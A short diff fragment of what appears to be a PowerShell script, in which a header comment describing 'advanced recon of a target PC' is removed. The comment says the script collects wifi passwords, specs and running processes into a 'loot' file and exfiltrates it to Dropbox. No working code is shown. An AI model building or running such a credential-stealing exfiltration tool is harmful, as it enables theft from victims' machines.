@@ -1,14 +1,4 @@
 
-                                                                                                                                                                                                                                               
-<#
-.SYNOPSIS
-	This is an advanced recon of a target PC and exfiltration of that data.
-.DESCRIPTION 
-	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running.
-	All of the gather information is formatted neatly and output to a file.
-	That file is then exfiltrated to cloud storage via Dropbox.
-
-
 ############################################################################################################################################################
 
 # MAKE LOOT FOLDER, FILE, and ZIP 
